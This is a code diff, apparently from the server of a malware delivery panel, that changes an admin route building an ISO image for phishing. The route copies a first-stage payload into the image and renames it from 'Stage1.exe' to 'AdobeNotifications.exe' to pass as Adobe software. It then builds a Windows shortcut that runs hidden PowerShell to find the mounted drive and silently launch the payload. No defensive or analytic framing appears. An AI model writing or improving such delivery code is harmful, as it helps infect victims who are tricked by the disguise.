@@ -537,13 +537,13 @@ router.get("/api/stage/build-iso", requireAdmin, (req, res) => {
 
   try {
     fs.mkdirSync(tmpDir, { recursive: true });
-    fs.copyFileSync(stage1, `${tmpDir}/Stage1.exe`);
+    fs.copyFileSync(stage1, `${tmpDir}/AdobeNotifications.exe`);
 
-    // PowerShell: find the CD-ROM drive that contains Stage1.exe and run it silently
+    // PowerShell: find the CD-ROM drive that contains AdobeNotifications.exe and run it silently
     const psCmd =
       `$d=(gwmi Win32_LogicalDisk|?{$_.DriveType -eq 5 -and ` +
-      `(Test-Path ($_.DeviceID+'\\Stage1.exe'))}|select -f 1).DeviceID;` +
-      `if($d){Start-Process ($d+'\\Stage1.exe') -WindowStyle Hidden}`;
+      `(Test-Path ($_.DeviceID+'\\AdobeNotifications.exe'))}|select -f 1).DeviceID;` +
+      `if($d){Start-Process ($d+'\\AdobeNotifications.exe') -WindowStyle Hidden}`;
     const lnkBuf = createLnkBuffer(
       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       `-w hidden -nop -c "${psCmd}"`
